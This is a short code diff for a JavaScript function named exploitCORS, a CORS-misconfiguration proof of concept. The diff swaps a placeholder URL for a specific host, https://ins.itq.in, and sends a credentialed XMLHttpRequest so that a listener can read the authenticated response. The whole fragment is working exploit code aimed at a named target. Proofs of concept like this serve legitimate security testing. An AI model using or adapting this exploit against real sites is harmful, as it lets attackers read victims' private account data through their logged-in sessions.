@@ -16,7 +16,7 @@
 function exploitCORS(){
     var req = new XMLHttpRequest();
     req.onload = reqListener;
-    req.open('get','vulnerable url',true);
+    req.open('get','https://ins.itq.in',true);
     req.withCredentials = true;
     req.send();
 }
